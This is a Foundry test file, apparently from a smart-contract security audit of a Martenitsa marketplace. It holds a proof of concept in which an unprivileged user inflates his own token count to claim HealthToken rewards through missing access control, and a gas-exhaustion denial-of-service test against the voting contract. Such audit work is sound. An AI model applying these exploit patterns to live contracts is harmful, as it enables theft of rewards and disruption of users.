// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test} from "forge-std/Test.sol";
import {BaseTest} from "./BaseTest.t.sol";
import {MartenitsaMarketplace} from "../src/MartenitsaMarketplace.sol";
import {MartenitsaToken} from "../src/MartenitsaToken.sol";
import "forge-std/console.sol";
import {Strings} from "../lib/openzeppelin-contracts/contracts/utils/Strings.sol";
contract HealthToken is Test, BaseTest {
    function testDistributeHealthToken() public {
        vm.prank(bob);
        vm.expectRevert();
        healthToken.distributeHealthToken(bob, 1);
    }
    function testAnyoneCanGetHealthTokensUsingCollectReward() public {
        vm.startPrank(bob);
        for (uint64 i = 0; i < 90; i++) {
            martenitsaToken.updateCountMartenitsaTokensOwner(bob, "add");
        }
        //increase Bob's token count without buying MartenitsaToken to 90 by calling getCountMartenitsaTokensOwner
        uint bobTokenCount = martenitsaToken.getCountMartenitsaTokensOwner(bob);
        assertEq(bobTokenCount, 90);
        //Ensure Bob doesn't actually have Martenitsa Tokens
        assertEq(martenitsaToken.isProducer(bob), false);
        assertEq(martenitsaToken.balanceOf(bob), 0);
        //Bob Shouldn't be able to get 30 healthTokens but he will as a result of lack of access control
        marketplace.collectReward();
        //token value represented i wei
        uint weiEq = 10 ** 18;
        assertEq(healthToken.balanceOf(bob) / weiEq, 30);
    }

    function testDenialOfService() public listMartenitsa {
        uint precall = gasleft();
        console.log("Initial gas left:", precall);
        voting.startVoting();
        for (uint i = 1; i < 1000000; i++) {
            string memory str_eq = Strings.toString(i);
            address caller = makeAddr(str_eq);
            vm.prank(caller);
            voting.voteForMartenitsa(0);
        }
        uint postcall = gasleft();
        console.log("Gas left after call", gasleft());
        uint gasConsumed = precall - postcall;
        console.log("Gas consumed by populating _tokenIds:", gasConsumed);
        console.log("Vote count for token ID 0:", voting.getVoteCount(0));
    }
}
